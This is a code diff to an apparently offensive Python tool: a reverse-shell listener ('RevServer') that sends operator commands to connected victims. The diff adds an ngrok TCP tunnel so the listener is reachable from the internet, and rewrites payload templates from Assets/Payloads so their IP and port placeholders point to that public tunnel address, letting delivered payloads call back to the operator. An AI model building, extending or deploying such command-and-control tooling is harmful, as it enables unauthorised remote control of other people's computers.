@@ -39,6 +39,10 @@ class RevServer:
             command += "\n"
             conn.send(command.encode())
             time.sleep(1)
+            if command == "exit\n":
+                conn.close()
+                self.log.error("Connection closed")
+                exit()
 
 
 
@@ -59,6 +63,7 @@ class NgrokServer:
         self.log = Log()
         self.key = key
         self.url = ""
+        self.tcp_url = ""
 
     def load_port(self):
         with open("Assets/config.json", "r") as f:
@@ -72,6 +77,11 @@ class NgrokServer:
         self.url = tunnel.public_url
         self.log.info("Ngrok tunnel: " + tunnel.public_url)
 
+    def tcp(self, port):
+        tunnel = ngrok.connect(port, "tcp")
+        self.tcp_url = tunnel.public_url
+        self.log.info("Ngrok tunnel: " + tunnel.public_url)
+
 class Main:
     def __init__(self):
         self.log = Log()
@@ -82,6 +92,7 @@ class Main:
         self.rev_port = self.log.inpt("Reverse port: ")
         self.rev_server = RevServer(self.rev_host, self.rev_port)
         self.ngrok_server = NgrokServer(self.key())
+        self.ngrok_server.tcp(self.rev_port)
 
     def setup(self):
         if not os.path.exists("Assets/config.json"):
@@ -108,7 +119,7 @@ class Main:
 
     def load_payload(self, file):
         with open(f"Assets/Payloads/{file + '.txt'}", "r") as f:
-            return f.read().replace("_IP_", self.rev_host).replace("_PORT_", f"{self.rev_port}").encode("utf-8")
+            return f.read().replace("_IP_", self.ngrok_server.tcp_url.split("tcp://")[1].split(":")[0]).replace("_PORT_", self.ngrok_server.tcp_url.split("tcp://")[1].split(":")[1]).encode("utf-8")
 
     def load_delivery(self, file):
         with open(f"Assets/Deliveries/{file + '.txt'}", "r") as f:
